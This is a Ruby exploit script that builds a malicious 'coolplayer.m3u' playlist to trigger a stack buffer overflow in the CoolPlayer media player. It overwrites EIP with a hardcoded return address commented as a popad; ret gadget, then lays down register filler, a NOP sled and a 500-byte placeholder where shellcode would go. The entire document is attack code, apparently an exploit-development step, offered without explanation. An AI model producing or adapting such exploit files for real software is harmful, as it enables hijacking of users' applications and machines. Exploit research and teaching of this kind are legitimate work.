#!/usr/bin/env ruby

buffsize = 10000
junk = "\x41" * 218

eip = "\x1B\x12\x93\x7C" # Memory address 0x7C93121B  for popad, ret
edi = "\x01" * 4
esi = "\x02" * 4
ebp = "\x03" * 4
ebp += "\x03" * 4
ebx = "\x04" * 4
edx = "\x05" * 4
ecx = "\x06" * 4
eax = "\x07" * 4
esp = "\xcc" * 4

nops = "\x90" * 20
shell = "\x42" * 500

sploit = junk + eip + edi + esi + ebp + ebx + edx + ecx + eax + esp + nops + shell
fill = "\x43" * (buffsize - sploit.size)
buffer = sploit + fill

exploit = "coolplayer.m3u"
File.open(exploit, 'w'){|a| a.write(buffer)}
puts "Exploit created: #{exploit}"
puts "Buffer size: #{buffer.size}"